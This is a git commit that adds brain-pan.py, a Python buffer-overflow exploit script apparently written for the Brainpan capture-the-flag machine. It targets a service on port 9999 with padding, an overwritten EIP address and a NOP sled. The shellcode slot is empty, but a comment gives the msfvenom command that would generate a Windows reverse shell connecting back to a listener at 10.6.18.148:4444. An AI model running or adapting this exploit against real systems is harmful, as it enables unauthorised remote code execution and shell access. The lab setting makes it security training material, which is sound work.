6c21078ead07ecdfd0d793485e3fddb1d13497b4
Checkn8 <69409917+NathanLundner@users.noreply.github.com>
2021-07-12 18:27:07 -0400

    Create brain-pan.py

---
+++ brain-pan.py
@@ -0,0 +1,30 @@
+#!/usr/bin/env python3
+
+import socket, time, sys
+
+ip = "RHOST IP"
+
+port = 9999
+timeout = 5
+
+# Generate Shell Code
+# msfvenom -p windows/shell_reverse_tcp LHOST=10.6.18.148 LPORT=4444 EXITFUNC=thread -f c -e x86/shikata_ga_nai -b "\x00"
+shell_code = ("")
+
+filler = "A" * 524
+eip = "\xf3\x12\x17\x31"  # "B" * 4
+nops ="\x90" *10
+
+string = filler + eip + nops + shell_code
+
+try:
+  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
+    s.settimeout(timeout)
+    s.connect((ip, port))
+    s.recv(1024)
+    print("Fuzzing with {} bytes".format(len(string)))
+    s.send(bytes(string, "latin-1"))
+    s.recv(1024)
+except:
+    print("Fuzzing crashed at {} bytes".format(len(string)))
+    sys.exit(0)
